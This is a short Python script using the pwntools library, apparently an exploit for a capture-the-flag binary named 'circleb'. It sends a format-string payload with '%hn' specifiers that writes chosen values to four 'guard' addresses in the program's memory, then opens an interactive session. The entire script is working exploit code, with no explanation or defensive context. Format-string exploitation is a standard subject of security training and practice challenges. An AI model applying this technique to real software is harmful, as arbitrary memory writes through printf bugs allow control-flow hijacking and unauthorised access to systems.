from pwn import*

p = process('./circleb')
#gdb.attach(p, api=True)

guard_4 = 0x404050 #9
guard_3 = 0x404052 #8
guard_2 = 0x404054 #7
guard_1 = 0x404056 #6
#3241

payload = p64(guard_1) + p64(guard_2) 
p.sendline(payload)
payload =  b"%23288x%8$hn" +b"%11598x%7$hn" + b"%10370x%9$hn" +b"%2247x%6$hn"
#payload = b" %p" * 15
payload += p64(guard_3) + p64(guard_4)
p.sendline(payload)
p.interactive()
